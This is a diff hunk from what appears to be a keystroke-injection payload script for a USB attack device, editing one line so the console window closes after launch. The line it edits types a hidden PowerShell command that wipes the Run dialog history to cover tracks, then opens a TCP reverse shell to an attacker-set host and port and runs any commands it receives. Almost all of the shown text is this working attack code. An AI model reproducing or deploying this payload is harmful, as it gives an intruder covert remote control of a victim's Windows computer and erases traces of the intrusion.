@@ -45,7 +45,7 @@ LED STAGE2
 Q STRING "mode 15,1 & color FE & cd C:\ & title "
 Q ENTER
 # Initiate reverse shell
-Q STRING "powershell -W Hidden \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue;Start-Sleep -m $NCDELAY;\$sm=(New-Object Net.Sockets.TCPClient('$HOST_IP',$NCPORT)).GetStream();[byte[]]\$bt=0..65535|%{0};while((\$i=\$sm.Read(\$bt,0,\$bt.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$bt,0,\$i);\$st=([text.encoding]::ASCII).GetBytes((iex \$d 2>&1));\$sm.Write(\$st,0,\$st.Length)}\""
+Q STRING "powershell -W Hidden \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue;Start-Sleep -m $NCDELAY;\$sm=(New-Object Net.Sockets.TCPClient('$HOST_IP',$NCPORT)).GetStream();[byte[]]\$bt=0..65535|%{0};while((\$i=\$sm.Read(\$bt,0,\$bt.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$bt,0,\$i);\$st=([text.encoding]::ASCII).GetBytes((iex \$d 2>&1));\$sm.Write(\$st,0,\$st.Length)}\" & exit"
 Q ENTER
 
 # Attack -- commands go within EOF
